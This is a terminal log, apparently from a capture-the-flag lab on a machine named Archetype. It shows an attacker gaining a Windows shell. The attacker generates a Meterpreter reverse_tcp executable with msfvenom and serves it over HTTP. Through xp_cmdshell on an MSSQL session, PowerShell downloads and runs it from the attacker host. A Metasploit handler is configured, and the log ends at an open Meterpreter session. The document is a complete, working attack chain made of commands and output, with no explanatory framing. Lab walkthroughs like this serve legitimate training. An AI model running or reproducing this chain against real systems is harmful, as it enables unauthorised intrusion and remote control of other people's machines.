
```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.11 LPORT=1337 -f exe > reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes


### Attacker - serve the file
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...



### Target  - download and execute the reverse shell
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c cd C:/Users/Public; wget http://10.10.16.11/reverse.exe -o reverse.exe '
output   
------   
NULL  

# Confirming reverse.exe is on the target
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c cd C:/Users/Public; ls reverse.exe '
output                                                                                                                    
-----------------------------------------------------------------------------------------------------------------------   
NULL                                                                                                                      

NULL                                                                                                                      

    Directory: C:\Users\Public                                                                                            

NULL                                                                                                                      

NULL                                                                                                                      

Mode                LastWriteTime         Length Name                                                                     

----                -------------         ------ ----                                                                     

-a----        8/17/2025  10:47 AM          73802 reverse.exe 

# Attacker - set up a reverse_tcp handler on msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf6 exploit(multi/handler) > options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh,
                                        thread, process, none)
   LHOST     tun0             yes       The listen address (an interface ma
                                        y be specified)
   LPORT     1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.11:1337 



# Running payload on target
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c cd C:/Users/Public; .\reverse.exe '

# Attacker - receives shell
[*] Sending stage (177734 bytes) to 10.129.156.174
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (10.10.16.11:1337 -> 10.129.156.174:49681) at 2025-08-17 12:05:12 -0600

meterpreter > 
```